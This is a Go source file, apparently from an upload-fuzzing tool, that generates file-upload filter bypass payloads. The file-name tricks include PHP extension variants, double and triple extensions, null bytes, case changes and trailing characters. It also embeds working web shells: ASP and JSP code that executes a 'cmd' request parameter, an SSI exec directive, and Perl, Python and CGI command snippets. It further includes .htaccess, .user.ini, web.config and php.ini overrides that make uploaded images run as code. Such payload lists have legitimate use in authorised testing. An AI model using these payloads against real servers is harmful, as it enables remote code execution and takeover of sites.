package bypass

import (
	"fux/config"
)

// ExtensionPayloads generates extension-based bypass payloads
func ExtensionPayloads(baseContent []byte) []config.BypassPayload {
	var payloads []config.BypassPayload

	// PHP Extensions
	phpExtensions := []string{
		"php", "php3", "php4", "php5", "php7", "php8",
		"phtml", "phar", "phps", "pht", "pgif", "pjpeg",
		"inc", "hphp", "ctp", "module",
	}

	for _, ext := range phpExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "PHP Extension: ." + ext,
			FileName:    "shell." + ext,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "extension",
		})
	}

	// Double Extension bypasses
	doubleExtensions := []string{
		"shell.php.jpg",
		"shell.php.png",
		"shell.php.gif",
		"shell.php.txt",
		"shell.php.pdf",
		"shell.php.doc",
		"shell.jpg.php",
		"shell.png.php",
		"shell.gif.php",
		"shell.txt.php",
		"shell.php.php",
		"shell.phtml.jpg",
		"shell.php5.png",
		"shell.phar.jpg",
	}

	for _, name := range doubleExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Double Extension: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "double-extension",
		})
	}

	// Null byte extension bypass (older PHP)
	nullByteExtensions := []string{
		"shell.php%00.jpg",
		"shell.php%00.png",
		"shell.php%00.gif",
		"shell.php\x00.jpg",
		"shell.php\x00.png",
		"shell.phtml%00.jpg",
		"shell.phar%00.txt",
	}

	for _, name := range nullByteExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Null Byte Extension: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "image/jpeg",
			Category:    "null-byte",
		})
	}

	// Case variations
	caseVariations := []string{
		"shell.PHP",
		"shell.Php",
		"shell.PHp",
		"shell.pHp",
		"shell.phP",
		"shell.pHP",
		"shell.PhP",
		"shell.PHTML",
		"shell.pHtMl",
		"shell.PHAR",
	}

	for _, name := range caseVariations {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Case Variation: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "case-variation",
		})
	}

	// Space/special characters in extension
	spaceExtensions := []string{
		"shell.php ",
		"shell.php.",
		"shell.php..",
		"shell.php...",
		"shell. php",
		"shell .php",
		"shell.php%20",
		"shell.php\t",
		"shell.php\n",
		"shell.php\r\n",
		"shell.php%0a",
		"shell.php%0d%0a",
	}

	for _, name := range spaceExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Space/Special Extension",
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "special-char",
		})
	}

	// Triple extensions
	tripleExtensions := []string{
		"shell.jpg.php.jpg",
		"shell.png.php.png",
		"shell.gif.php.gif",
		"shell.php.jpg.php",
		"shell.txt.php.txt",
	}

	for _, name := range tripleExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Triple Extension: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "image/jpeg",
			Category:    "triple-extension",
		})
	}

	// ASP/ASPX Extensions (IIS)
	aspExtensions := []string{
		"shell.asp",
		"shell.aspx",
		"shell.asa",
		"shell.cer",
		"shell.cdx",
		"shell.ashx",
		"shell.asmx",
		"shell.asp.jpg",
		"shell.aspx.png",
		"shell.asp;.jpg",
	}

	aspContent := []byte(`<%@ Page Language="C#" %><%Response.Write(Server.Execute(Request["cmd"]));%>`)

	for _, name := range aspExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "ASP Extension: " + name,
			FileName:    name,
			Content:     aspContent,
			ContentType: "application/octet-stream",
			Category:    "asp-extension",
		})
	}

	// JSP Extensions (Java/Tomcat)
	jspExtensions := []string{
		"shell.jsp",
		"shell.jspx",
		"shell.jsw",
		"shell.jsv",
		"shell.jspf",
		"shell.war",
		"shell.jsp.jpg",
		"shell.jspx.png",
	}

	jspContent := []byte(`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`)

	for _, name := range jspExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "JSP Extension: " + name,
			FileName:    name,
			Content:     jspContent,
			ContentType: "application/octet-stream",
			Category:    "jsp-extension",
		})
	}

	// Server-side includes
	ssiExtensions := []string{
		"shell.shtml",
		"shell.stm",
		"shell.shtm",
		"shell.shtml.jpg",
	}

	ssiContent := []byte(`<!--#exec cmd="id" -->`)

	for _, name := range ssiExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "SSI Extension: " + name,
			FileName:    name,
			Content:     ssiContent,
			ContentType: "text/html",
			Category:    "ssi-extension",
		})
	}

	// Python/Perl/Ruby
	scriptExtensions := []struct {
		ext     string
		content []byte
	}{
		{"py", []byte("import os; os.system('id')")},
		{"pl", []byte("#!/usr/bin/perl\nsystem($ENV{'cmd'});")},
		{"rb", []byte("<%=`id`%>")},
		{"cgi", []byte("#!/bin/bash\necho Content-type: text/html\necho\nid")},
	}

	for _, se := range scriptExtensions {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Script Extension: ." + se.ext,
			FileName:    "shell." + se.ext,
			Content:     se.content,
			ContentType: "application/octet-stream",
			Category:    "script-extension",
		})
	}

	// Config files that may be interpreted
	configFiles := []struct {
		name    string
		content []byte
	}{
		{".htaccess", []byte("AddType application/x-httpd-php .jpg\n")},
		{".user.ini", []byte("auto_prepend_file=shell.jpg\n")},
		{"web.config", []byte(`<?xml version="1.0"?><configuration><system.webServer><handlers><add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="c:\php\php-cgi.exe" resourceType="Unspecified"/></handlers></system.webServer></configuration>`)},
		{"php.ini", []byte("auto_prepend_file=/var/www/html/uploads/shell.jpg\n")},
	}

	for _, cf := range configFiles {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Config File: " + cf.name,
			FileName:    cf.name,
			Content:     cf.content,
			ContentType: "text/plain",
			Category:    "config-file",
		})
	}

	return payloads
}
